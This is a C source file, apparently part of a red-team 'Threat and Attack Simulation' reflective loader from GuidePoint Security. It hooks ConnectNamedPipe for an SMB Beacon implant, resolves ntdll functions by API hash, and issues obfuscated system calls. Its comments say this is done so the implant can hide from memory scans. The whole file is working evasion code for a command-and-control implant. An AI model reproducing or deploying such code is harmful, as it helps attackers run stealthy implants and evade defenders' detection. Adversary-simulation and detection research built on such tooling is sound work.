/**
 *
 * Reflective Loader
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack SimulatioN
 *
**/

#include "Common.h"

/* CTL Codes */
#define FSCTL_PIPE_LISTEN		CTL_CODE( FILE_DEVICE_NAMED_PIPE, 2, METHOD_BUFFERED, FILE_ANY_ACCESS )

typedef struct
{
	D_API( NtWaitForSingleObject );
	D_API( RtlNtStatusToDosError );
	D_API( RtlSetLastWin32Error );
	D_API( NtFsControlFile );
} API ;

/* API Hashes */
#define H_API_NTWAITFORSINGLEOBJECT	0xe8ac0c3c /* NtWaitForSingleObject */
#define H_API_RTLNTSTATUSTODOSERROR	0x39d7c890 /* RtlNtStatusToDosError */
#define H_API_RTLSETLASTWIN32ERROR	0xfd303374 /* RtlSetLastWin32Error */
#define H_API_NTFSCONTROLFILE		0xecdfd601 /* NtFsControlFile */

/* LIB Hashes */
#define H_LIB_NTDLL			0x1edab0ed /* ntdll.dll */	

/*!
 *
 * Purpose:
 *
 * Awaits for a connection for a SMB Beacon, and
 * creates a ROP chain to hide itself from any
 * memory scans.
 *
!*/
D_SEC( D ) BOOL WINAPI ConnectNamedPipe_Hook( _In_ HANDLE hNamedPipe, _Inout_ LPOVERLAPPED lpOverlapped )
{
	API			Api;
	IO_STATUS_BLOCK		Isb;

	BOOLEAN			Ret = TRUE;
	NTSTATUS		Nst = STATUS_UNSUCCESSFUL;

	PVOID			Apc = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Isb, sizeof( Isb ) );

	Api.NtWaitForSingleObject = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTWAITFORSINGLEOBJECT );
	Api.RtlNtStatusToDosError = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLNTSTATUSTODOSERROR );
	Api.RtlSetLastWin32Error  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLSETLASTWIN32ERROR );
	Api.NtFsControlFile       = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTFSCONTROLFILE );

	if ( lpOverlapped != NULL ) 
	{
		lpOverlapped->Internal = STATUS_PENDING;
		Apc = C_PTR( U_PTR( U_PTR( lpOverlapped->hEvent ) & 0x1 ) ? NULL : lpOverlapped );

		PVOID Ag1[] = {
			C_PTR( hNamedPipe ),
			C_PTR( lpOverlapped->hEvent ),
			C_PTR( NULL ),
			C_PTR( Apc ),
			C_PTR( lpOverlapped ),
			C_PTR( FSCTL_PIPE_LISTEN ),
			C_PTR( NULL ),
			C_PTR( 0 ),
			C_PTR( NULL ),
			C_PTR( 0 )
		};

		Nst = ObfSystemCall( Api.NtFsControlFile, Ag1, ARRAYSIZE( Ag1 ) );

		if ( ! NT_SUCCESS( Nst ) || Nst == STATUS_PENDING ) { 
			Api.RtlSetLastWin32Error( Api.RtlNtStatusToDosError( Nst ) );
			Ret = FALSE;
		};
	} else {

		PVOID Ag1[] = {
			C_PTR( hNamedPipe ),
			C_PTR( NULL ),
			C_PTR( NULL ),
			C_PTR( NULL ),
			C_PTR( &Isb ),
			C_PTR( FSCTL_PIPE_LISTEN ),
			C_PTR( NULL ),
			C_PTR( 0 ),
			C_PTR( NULL ),
			C_PTR( 0 )
		};
		Nst = ObfSystemCall( Api.NtFsControlFile, Ag1, ARRAYSIZE( Ag1 ) );

		if ( Nst == STATUS_PENDING ) {

			PVOID Ag2[] = {
				C_PTR( hNamedPipe ),
				C_PTR( FALSE ),
				C_PTR( NULL )
			};
			Nst = ObfSystemCall( Api.NtWaitForSingleObject, Ag2, ARRAYSIZE( Ag2 ) );

			if ( NT_SUCCESS( Nst ) ) { 
				Nst = Isb.Status;
			};
		};
		if ( ! NT_SUCCESS( Nst ) ) {
			Api.RtlSetLastWin32Error( Api.RtlNtStatusToDosError( Nst ) );
			Ret = FALSE;
		};
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Isb, sizeof( Isb ) );

	return Ret;
};
